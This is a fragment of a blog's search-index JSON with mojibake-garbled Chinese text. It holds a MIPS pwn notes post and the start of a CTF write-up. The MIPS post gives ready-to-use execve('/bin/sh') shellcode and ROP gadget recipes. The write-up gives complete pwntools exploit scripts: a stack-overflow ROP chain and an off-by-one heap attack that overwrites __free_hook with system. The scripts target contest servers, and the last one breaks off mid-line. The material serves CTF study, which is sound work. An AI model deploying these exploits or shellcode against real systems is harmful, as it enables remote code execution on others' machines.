·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚\n\n- $24..$25:($t8-$t9)\n\nåŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤`mfc0`(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ`jr`)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚\nå‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚\n\n- $28:($gp)\n\nä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚\n\n- $29:($sp)\n\nMIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚\n\n- $30:($fp)\n\nGNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚\n\n- $31:($ra)\n\nå­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª`jal`(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å`jal X`è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨`jr $ra`è¿”å›ã€‚\n\n\n\n## 2.æŒ‡ä»¤\n\n### (1)ä¸åŒç±»å‹çš„æŒ‡ä»¤\n\n#### Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨\n\nå¸¸è§æŒ‡ä»¤ï¼š`add`, `sub`, `and`, `or`, `nor`, `slt`, `sll`, `srl`, `jr`\n\n![image-20211230150231733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png)\n\n- opcodï¼šæ“ä½œç  \n- rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ \n- rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ \n- rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·\n- shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰\n- Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ \n\nShamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚`stl`ï¼‰\n\n#### Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡\n\nå¸¸è§æŒ‡ä»¤ï¼š`addi`, `lw`, `sw`, `lh`, `sh`, `lb`, `lbu`, `sb`, `ll`, `sc`, `lui`, `andi`, `ori`, `beq`, `bne`, `slti`, `sltiu`\n\n![img](https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=%2F1625856577691_8905.png&versionDescriptor[versionOptions]=0&versionDescriptor[versionType]=0&versionDescriptor[version]=master&resolveLfs=true&%24format=octetStream&api-version=5.0)\n\n- opcodï¼šæ“ä½œç \n- rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡\n- rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡\n- imd: ç«‹å³å€¼\n\n\n\n#### Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€\n\nå¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤\n\nå¸¸è§æŒ‡ä»¤ï¼š`j`, `jal`\n\n![image-20211230150255746](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png)\n\n- Opcodï¼šæ“ä½œç \n- Imdï¼šç«‹å³å€¼\n\n\n\n### (2)å¸¸ç”¨æŒ‡ä»¤\n\nå…¶ä¸­`i`è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ`u`è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚\n\n#### â‘ load/store æŒ‡ä»¤\n\n- laï¼šå°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:`la $t0,val_1`å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel\n\n- liï¼šå°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:`li $t1, 40` $t1 = 40\n\n- lwï¼šä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:`lw $s0, 0($sp) $s0=MEM[$sp+0]`\n\n- swï¼šå°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:`sw $a0, 0($sp) MEM[$sp+0] = $a0`\n\n- moveï¼šå¯„å­˜å™¨ä¼ å€¼ egï¼š`move $t5, $t2 $t5 = $t2`\n\n#### â‘¡ç®—æ•°æŒ‡ä»¤\n\nç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰\n\n```asm\nadd $t0, $t1, $t2;\t\t$t0=$t1+$t2;\tå¸¦ç¬¦å·æ•°ç›¸åŠ \nsub $t0, $t1, $t2;\t\t$t0=$t1-$t2;\tå¸¦ç¬¦å·æ•°ç›¸å‡\naddi $t0, $t1, 5;\t\t$t0=$t1+5;\t\tæœ‰ç«‹å³æ•°çš„åŠ æ³•\naddu $t0, $t1, $t2;\t\t$t0=$t1+$t2;\tæ— ç¬¦å·æ•°çš„åŠ æ³•\nsubu $t0, $t1, $t2;\t\t$t0=$t1-$t2;\tå¸¦ç¬¦å·æ•°ç›¸å‡\nmult $t3, $t3;\t\t\t(HI, LO) = $t3 * $t4\ndiv $t5, $t6;\t\t\t$Hi=$t5 mod $t6\nmfhi $t0;\t\t\t\t$t0 = $Hi\nmflo $t1;\t\t\t\t$t1 = $Lo\n```\n\n#### â‘¢syscall\n\näº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›\n\nè¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶\n\nWrite(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹\n\n```asm\naddiu $sp, $sp, -32;\nli $a0, 1;\nlui $t6, 0x4142;\nori $t6, $t6, 0x430a;\nsw  $t6, $0($sp);\naddiu $a1, $sp, 0;\nli $a2, 5;\nli $v0, 4004;\nsyscall;\n```\n\n#### â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤\n\nåˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°\n\n```asm\nb target;\t\t\t\tæ— æ¡ä»¶è·³è½¬åˆ°targetå¤„\nbeq $t0, $t1, target;\tå¦‚æœ\"$t0 == $t1â€ï¼Œè·³è½¬åˆ°target\nblt $t0, $t1, target;\tå¦‚æœâ€œ$t0 < $t1â€ï¼Œè·³è½¬åˆ°target\nble $t0, $t1, target;\tå¦‚æœâ€œ$t0 <= $t1â€ è·³è½¬åˆ°target\nbgt;\nblt;\nbne;\t\t\t\t\tç±»æ¯”ä¸Š\n```\n\n#### â‘¤è·³è½¬æŒ‡ä»¤\n\n```asm\nj target;\t\t\tæ— æ¡ä»¶è·³è½¬target\njr $t3;\t\t\t\tè·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register)\njal target;\t\t\tè·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­\n```\n\n#### â‘¥å­å‡½æ•°çš„è°ƒç”¨\n\n```asm\njal   sub_routine_label;å¤åˆ¶å½“å‰PCçš„å€¼åˆ°$raä¸­ï¼Œï¼ˆå½“å‰PCå€¼å°±æ˜¯è¿”å›åœ°å€ï¼‰ç¨‹åºè·³è½¬åˆ°sub_routine_label\n```\n\n#### â‘¦å­å‡½æ•°çš„è¿”å›\n\n```asm\njr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€\n```\n\n\n\nä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹\n\n[MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvain's Blog (valeeraz.github.io)](https://valeeraz.github.io/2020/05/08/architecture-mips/)\n\n[2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/259594)\n\n\n\n## 3.æµæ°´çº¿ç‰¹ç‚¹\n\nä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2\n\n```asm\nmov $a0, $s2;\njalr strchr;\nmove $a0, $s0;\n```\n\n## ğŸ”ºæ³¨ï¼šæµæ°´çº¿\n\nå³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚\n\nä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚\n\n\n\n\n\n## 4.å¸¸ç”¨ROPå¯»å€\n\nIDAä¸­\n\n```python\n#mipsrop\nimport mipsrop\nmipsrop=mipsrop.MIPSROPFinder()\nmipsrop.find(\"\")\nmipsrop.stackfinder() #å¯»æ‰¾æ ˆæ•°æ®å¯æ§çš„ ropï¼Œå»ºç«‹å’Œ a0ã€a1 å¯„å­˜å™¨çš„å…³ç³»\nmipsrop.summary() #åˆ—å‡ºæ‰€æœ‰çš„å¯ç”¨ rop\nmipsrop.system() #å¯»æ‰¾å‘½ä»¤æ‰§è¡Œçš„çš„rop\nmipsrop.find('jr $ra')\nmipsrop.find(\"move $t9, $s3\")\nmipsrop.find(\"addiu $a1,$sp\")\n```\n\nå¾ˆå¤šå¥½ç”¨ROPçš„å¯åœ¨libcçš„scandir_tailç±»åˆ«å‡½æ•°ä¸‹å¯ä»¥æ‰¾åˆ°\n\nROPä¸‰éƒ¨æ›²\n\n### (1)gadget1\n\nä»spæ§åˆ¶å¯„å­˜å™¨\n\n```\nlw ra,0x3c(sp);lw s3,0x2c(sp);lw s2,0x28(sp);lw s1,0x24(sp);lw s0,0x20(sp);\n```\n\nè¿™ä¸ªé€šå¸¸å¯ä»¥åœ¨scandir_tailå‡½æ•°ä¸­æ‰¾ï¼Œæˆ–è€…å¦‚ä¸‹\n\n```python\nmipsrop.find('jr $ra')\n```\n\n### (2)gadget2\n\nä»æ ˆå–åœ°å€ç»™å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬ä¹‹å‰æ§åˆ¶ä½çš„å¯„å­˜å™¨\n\n```\naddiu a1,0x18(sp);move t9,s3;jalr t9\n```\n\naddiuæŒ‡ä»¤å³æ˜¯å–æ ˆåœ°å€åˆ°a1å¯„å­˜å™¨ï¼Œæ–¹ä¾¿ä¹‹åè·³è½¬ï¼Œå¦‚ä¸‹å¯»æ‰¾æŒ‡ä»¤\n\n```python\nmipsrop.find(\"addiu $a1,$sp\")\n```\n\n### (3)gadget3\n\nè·³è½¬ä¿å­˜æ ˆåœ°å€çš„å¯„å­˜å™¨\n\n```\nmove t9,a1;move a1,a2;jr t9\n```\n\nå¦‚ä¸‹å¯»å€æŒ‡ä»¤\n\n```python\nmipsrop.find(\"move $t9, $s3\")\n```\n\nå› ä¸ºä¸€èˆ¬ä¸ŠåŸºæœ¬ä¸å­˜åœ¨ç›´æ¥å–åœ°å€ç„¶åè·³è½¬çš„ï¼Œæ‰€ä»¥éœ€è¦å¤šé‡è·³è½¬æ¥å®Œæˆã€‚\n\n\n\n## ğŸ”ºå¯ç”¨shellcode:\n\n### (1)ç›´æ¥å¯ç”¨çš„\n\n```python\nshellcode = b\"\"\nshellcode += b\"\\xff\\xff\\x06\\x28\"  # slti $a2, $zero, -1\nshellcode += b\"\\x62\\x69\\x0f\\x3c\"  # lui $t7, 0x6962         ib\nshellcode += b\"\\x2f\\x2f\\xef\\x35\"  # ori $t7, $t7, 0x2f2f    ib//\nshellcode += b\"\\xf4\\xff\\xaf\\xaf\"  # sw $t7, -0xc($sp)      \nshellcode += b\"\\x73\\x68\\x0e\\x3c\"  # lui $t6, 0x6873         hs\nshellcode += b\"\\x6e\\x2f\\xce\\x35\"  # ori $t6, $t6, 0x2f6e    hs/n\nshellcode += b\"\\xf8\\xff\\xae\\xaf\"  # sw $t6, -8($sp)\nshellcode += b\"\\xfc\\xff\\xa0\\xaf\"  # sw $zero, -4($sp)\nshellcode += b\"\\xf4\\xff\\xa4\\x27\"  # addiu $a0, $sp, -0xc   //bin/sh\nshellcode += b\"\\xff\\xff\\x05\\x28\"  # slti $a1, $zero, -1\nshellcode += b\"\\xab\\x0f\\x02\\x24\"  # addiu $v0, $zero, 0xfab\nshellcode += b\"\\x0c\\x01\\x01\\x01\"  # syscall 0x40404\n```\n\n\n\n### (2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š\n\n```python\nshellcode1 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n    \"\\x20\\x28\\x40\\x02\" + \\\n    \"\\x20\\x30\\x40\\x02\" + \\\n    \"\\x28\\xfe\\xa2\\x8f\" + \\\n    \"\\x0c\\x01\\x01\\x01\"\n```\n\nå¯¹åº”çš„å¦‚ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n```bash\nrasm2 -a mips -b 32 -C \"lw a0,-0x1e4(sp)\" \t#a\nrasm2 -a mips -b 32 -C \"move a1,s2\"\t\t\t#a1\nrasm2 -a mips -b 32 -C \"move a2,s2\"\t\t\t#a2\nrasm2 -a mips -b 32 -C \"lw v0,-0x1d8(sp)\"\t#v0\nrasm2 -a mips -b 32 -C \"syscall\"\t\t\t#syscall\n```\n","tags":["å¼‚æ„"],"categories":["PWN","å¼‚æ„"]},{"title":"å¼ºç½‘æ‹Ÿæ€WP","url":"/2021/10/26/å¼ºç½‘æ‹Ÿæ€WP/","content":"\næ€»çš„æ¥è¯´è¿™æ¬¡å¼ºç½‘æ‹Ÿæ€çš„PWNé¢˜éƒ½ä¸ç®—éš¾ï¼Œä¸è¿‡æœ‰å‡ ä¸ªç‚¹å€’æ˜¯æŒºæœ‰æ„æ€çš„ã€‚\n\n# ä¸€ã€sonic\n\næ³„éœ²elf_baseäº†ï¼Œç„¶åç›´æ¥æ ˆæº¢å‡ºï¼Œåˆ©ç”¨æœ¬èº«è‡ªå¸¦çš„gadgetå³å¯getshellã€‚ä½†æ˜¯è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œä¹‹åæ‰å‘ç°çš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚`/usr/bin/cli`è¿™ä¸ªå‘½ä»¤å±…ç„¶ç›´æ¥å¾—åˆ°flagã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./sonic\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"123.60.63.90\",6890)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\nru(\"main Address=0x\")\nelf_base = int(rc(12),16) -0x7cf\nbackdoor = elf_base+0x73A\nlg(\"elf_base\",elf_base)\n\npop_rdi_ret = 0x00000000000008c3\npop_rsi_r15_ret = 0x00000000000008c1\nusrname = 0x201040\nexecv = 0x610\n\npayload = \"\"\npayload += '/bin/sh\\x00'.ljust(0x28,'A')\npayload += p64(elf_base + pop_rdi_ret)\npayload += p64(elf_base + usrname)\npayload += p64(elf_base + pop_rsi_r15_ret)\npayload += p64(0)\npayload += p64(0)\npayload += p64(elf_base + execv)\n\n#dbg()\nsl(payload)\n#pause()\np.interactive()\n\n\n#flag{riCGJnvUieCXasPUUiAQ6XzWVdjFJTQB}\n```\n\nè¿™é‡Œå¯ä»¥æ³¨æ„ä¸‹execvè¿™ä¸ªå‡½æ•°ï¼Œè®¾ç½®äº†rdiä¸º`/bin/sh`ä¹‹åè¿˜éœ€è¦è®¾ç½®rsiä¸º0æ‰å¯getshellã€‚\n\n\n\n# äºŒã€bitflip\n\nè¿™ä¹Ÿæ˜¯å¾ˆå¸¸è§„ï¼Œ2.27çš„off by oneï¼Œåªèƒ½æœ€å¤§0x60çš„Chunkï¼Œå¯ä»¥ç›´æ¥æ”¹sizeå¤§äº0x80çš„fastbinï¼Œå¡«æ»¡tcacheä¹‹åé‡Šæ”¾è¿›å…¥Unsortedbinæ³„éœ²åœ°å€ï¼Œä¹‹åå°±å¸¸è§„æ”¹free_hookäº†ã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./bitflip\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.130.185\",\"49155\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\ndef add(idx,size):\n\tsla(menu,'1')\n\tsla('Index: ',str(idx))\n\tsla('Size: ',str(size))\ndef edit(idx,con):\n\tsla(menu,'2')\n\tsla('Index: ',str(idx))\n\tsla('Content: ',con)\ndef show(idx):\n\tsla(menu,'3')\n\tsla('Index: ',str(idx))\ndef delete(idx):\n\tsla(menu,'4')\n\tsla('Index: ',str(idx))\n\n\nfor i in range(8):\n \tadd(i,0x38)\n\nfor i in range(8,12):\n \tadd(i,0x38)\n\nfor i in range(8):\n \tedit(i,(0x38)*\"\\x11\"+'\\xe1')\n\nedit(11,\"\\x21\"*0x18+p64(0x21))\n\nfor i in range(8):\n \tdelete(i+1)\n\n\nadd(12,0x38)\nshow(12)\nlibc_base = u64Leakbase(304+0x10+libc.sym['__malloc_hook'])\n\n__free_hook_addr = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"__free_hook_addr\",__free_hook_addr)\nlg(\"system_addr\",system_addr)\n\nadd(13,0x38)\ndelete(10)\ndelete(13)\nedit(9,p64(__free_hook_addr))\nadd(14,0x38)\nadd(15,0x38)\nedit(15,p64(system_addr))\nedit(0,'/bin/sh\\x00')\ndelete(0)\nit()\n\n#flag{2296341872d87bd532c121d14d55c4ac}\n```\n\n# ä¸‰ã€old_school\n\nå¾ˆå¸¸è§„ï¼Œ2.27çš„off by oneï¼Œç›´æ¥æ‹¿off by nullçš„æ¨¡æ¿æ”¹äº†ï¼Œå…¶å®ç”¨ä¸Šé¢bitflipçš„æ¨¡æ¿ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ”¹sizeã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./old_school\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif 